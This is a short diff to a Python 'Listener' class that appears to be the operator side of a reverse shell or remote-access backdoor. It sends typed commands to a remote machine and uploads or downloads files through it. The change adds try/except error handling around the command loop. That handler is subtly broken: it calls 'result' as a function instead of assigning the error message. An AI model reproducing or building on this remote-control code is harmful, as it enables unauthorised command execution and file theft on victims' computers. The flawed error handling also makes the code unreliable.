@@ -46,16 +46,26 @@ class Listener:
             command = input('>> ')
             command = command.split(' ')
 
-            if command[0] == 'upload': # ['upload', 'file name'].append('file content as binary')
-                file_content = self.read_file(command[1])
-                command.append(file_content)
+
+            try: 
+
+                if command[0] == 'upload': # ['upload', 'file name'].append('file content as binary')
+                    file_content = self.read_file(command[1])
+                    command.append(file_content)
 
 
 
-            result = self.execute_remote_command(command)
+                result = self.execute_remote_command(command)
 
-            if command[0] == 'download':  # ['download', 'file name']
-                self.write_file(command[1], result)
+                if command[0] == 'download' and '[x] Error' not in result:  # ['download', 'file name']
+                    self.write_file(command[1], result)
+
+            except Exception:
+                
+                result('[x] Error during command execution')
+
+
+
 
             print(result)
 
